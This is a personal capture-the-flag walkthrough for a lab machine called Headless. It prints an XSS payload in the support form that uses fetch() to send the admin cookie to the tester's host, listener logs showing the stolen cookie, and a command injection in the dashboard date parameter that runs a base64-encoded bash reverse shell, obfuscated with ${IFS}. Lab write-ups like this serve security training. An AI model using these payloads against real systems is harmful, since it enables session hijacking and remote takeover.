# Headless Machine season 4

## Target IP

- [1] : 10.10.11.8
- [2] : port 22 and 5000 open

## Enumeration 
- [+] : port 5000 -> webpage 

- [+] : whatweb http://headless.htb:5000/

http://headless.htb:5000/ [200 OK] Cookies [Is_Admin] -> maybe im already admin
, Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[10.10.11.8], Python[3.11.2], Script, Title[Under Construction], Werkzeug[2.2.2]

- [+] : I can try to inject javascript in /support 

- [1] : trying XSS shows 

		Hacking Attempt Detected

		Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation.

		Client Request Information:

		Method: POST
		URL: http://headless.htb:5000/support
		Headers: Host: headless.htb:5000
		User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
		Accept-Language: en-US,en;q=0.5
		Accept-Encoding: gzip, deflate
		Referer: http://headless.htb:5000/support
		Content-Type: application/x-www-form-urlencoded
		Content-Length: 207
		Origin: http://headless.htb:5000
		Dnt: 1





- [+] : I can try to use admin cookie in /dashboard 

- [1] : Shows 401 Unauthorized ## Maybe have to check request with burp later

## Tried to Send request with traficked date , since the website is supposed to work until 24 hours passes 

- [2] : good source -> https://superuser.com/questions/801772/401-unauthorized-page-displays-server-info-is-this-a-security-issue
		
- [+] : ecdsa-sha2-nistp256 key decoded

		Key type: ecdsa-sha2-nistp256
		Curve: nistp256
		Point: 0x0495c1996799628d4b479d094ecf222b22021d3efa8bbf9f04fa1e88a0d7461ce3b1f316aeec07ae8b07a12c11c62a9475a2582f026058ebfe8c5001e399d1407c	
		

## Foothold
 
- [1] : message parameter injectable -> test; <img src=x onerror=fetch('http://10.10.14.32/c='+document.cookie);>

- [2] : php -S 0.0.0.0:80

[Sun Mar 24 01:00:29 2024] PHP 8.2.7 Development Server (http://0.0.0.0:80) started
[Sun Mar 24 01:00:56 2024] 10.10.11.8:54680 Accepted
[Sun Mar 24 01:00:56 2024] 10.10.11.8:54680 [404]: GET /c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 - No such file or directory

we can see 2 gets one from ourselves and one from the admin logs I would guess cuz the second get takes time to comeback

### Now lets go to dashboard again ;)
### it shows a date that is fixed to 09-15-2023 ## Clicking generate report shows "Systems are up and running!"

- [1] : date parameter seems to be injectable -> date=2024-09-15; curl http://10.10.14.32:8008/revshell.sh 

		python3 -m http.server 8008
		Serving HTTP on 0.0.0.0 port 8008 (http://0.0.0.0:8008/) ...
		10.10.11.8 - - [24/Mar/2024 01:11:12] code 404, message File not found
		10.10.11.8 - - [24/Mar/2024 01:11:12] "GET /revshell.sh HTTP/1.1" 404 
		
- [1] : Get revshell :
		
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.32/4444 0>&1'" | base64 
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMi80NDQ0IDA+JjEnCg==

date=2024-09-15;echo${IFS}"YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMi80NDQ0IDA+JjEnCg=="${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash; #### URL ENCODE IT !!!!!!!!!!!!!!!!!!!!


- [2] : Get root

sudo -l can run /usr/bin/syscheck
create initdb.sh and -> su root into it
	

	
	

